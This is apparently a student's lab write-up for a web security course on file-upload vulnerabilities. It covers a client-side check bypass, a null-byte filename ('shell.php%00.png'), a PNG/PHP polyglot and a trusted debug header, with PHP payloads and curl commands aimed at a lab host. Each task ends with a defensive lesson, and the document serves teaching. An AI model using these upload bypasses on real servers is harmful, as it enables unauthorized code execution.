# Web Application Security – 0x05 Upload Vulnerabilities  
**Target:** `test-s3.web0x05.hbtn`  
**Module:** Cyber - WebSec 0x05  

---

# 🧩 Task 1 – Client-Side Validation Bypass

## 🎯 Objective  
Bypass client-side file type restrictions and upload a PHP file to retrieve `FLAG_1.txt`.

## 🔍 Analysis  
The upload form restricted file types using client-side validation (HTML `accept` attribute and/or JavaScript filtering).

Client-side validation is not security and can be bypassed by modifying HTTP requests.

## 🚀 Exploitation  

1. Intercepted the upload request using Burp Suite.
2. Modified the filename to `shell.php`.
3. Uploaded the following payload:

```php
<?php readfile('FLAG_1.txt'); ?>

    Accessed:

/static/upload/shell.php

🛑 Root Cause

No server-side validation of file extension.
🔐 Security Lesson

Client-side validation must always be enforced server-side.
🧩 Task 2 – Special Characters & Null Byte Injection
🎯 Objective

Bypass server-side extension validation using special characters.
🔍 Analysis

The server validated file extensions but improperly handled special characters in filenames.

Testing revealed a null byte injection vulnerability.
🚀 Exploitation

Uploaded file using:

filename="shell.php%00.png"

What Happened:

    Validator saw .png

    %00 decoded to a null byte (\0)

    Filesystem truncated filename at null byte

    File saved as shell.php

Payload used:

<?php readfile('FLAG_2.txt'); ?>

Then accessed:

/static/upload/shell.php

🛑 Vulnerability

CWE-158 – Improper Neutralization of Null Byte
🔐 Security Lesson

    Reject null bytes in filenames.

    Normalize filenames before validation.

    Never trust user-supplied filenames.

🧩 Task 3 – Magic Number Validation Bypass
🎯 Objective

Bypass server-side content validation based on file magic numbers.
🔍 Analysis

The server validated file content using file signatures (magic numbers), likely with:

    finfo_file()

    getimagesize()

A valid image structure was required to pass validation.
🚀 Exploitation
Step 1 – Create a valid PNG image

convert -size 1x1 xc:white legit.png

Step 2 – Append PHP payload

echo "<?php readfile('FLAG_3.txt'); ?>" >> legit.png

Step 3 – Exploit extension validation again

Uploaded using:

filename="shell.php%00.png"

Step 4 – Retrieve flag

curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php | strings

🧠 Why It Worked

    Real PNG passed content validation.

    Null byte bypassed extension validation.

    PHP executed appended payload.

    Binary data appeared first, flag appeared afterward.

🔐 Security Lesson

Magic number validation alone is insufficient.
Uploaded files should never be executable.
🧩 Task 4 – File Length Restriction & Debug Header Backdoor
🎯 Objective

Bypass file size restrictions to upload a PHP file and retrieve FLAG_4.txt.
🔍 Analysis

Uploading a large file returned:

X-Debug-Mode: False

The challenge hinted that a backdoor was present in the response headers.
🚀 Exploitation

Sent request with:

X-Debug-Mode: True

Example:

curl -i -X POST http://test-s3.web0x05.hbtn/api/task4/ \
  -H "X-Debug-Mode: True" \
  -F "file=@shell.php"

This bypassed the file size restriction.

Uploaded payload:

<?php readfile('FLAG_4.txt'); ?>

Retrieved flag via:

curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php | strings

🛑 Vulnerability

Trusting a client-controlled debug header.
🔐 Security Lesson

    Never trust client-controlled headers.

    Debug toggles must be server-side only.

    Security controls must not depend on request headers.

📌 Summary of Vulnerabilities
Task	Vulnerability
1	Client-side validation bypass
2	Null byte injection (CWE-158)
3	Polyglot file / incomplete content validation
4	Trust boundary violation (debug header abuse)
🧠 Key Takeaways

    Client-side validation is not security.

    Filenames must be sanitized and normalized.

    Magic number checks are not sufficient alone.

    Uploaded files should never be executable.

    Security decisions must never trust client input.

    Layered defenses fail if inconsistently implemented.

🏁 Conclusion

This lab demonstrates how attackers can chain multiple validation flaws:

    Bypassing frontend checks

    Exploiting filename parsing bugs

    Crafting polyglot files

    Abusing trusted headers

Each layer of protection failed due to improper trust boundaries and inconsistent validation logic.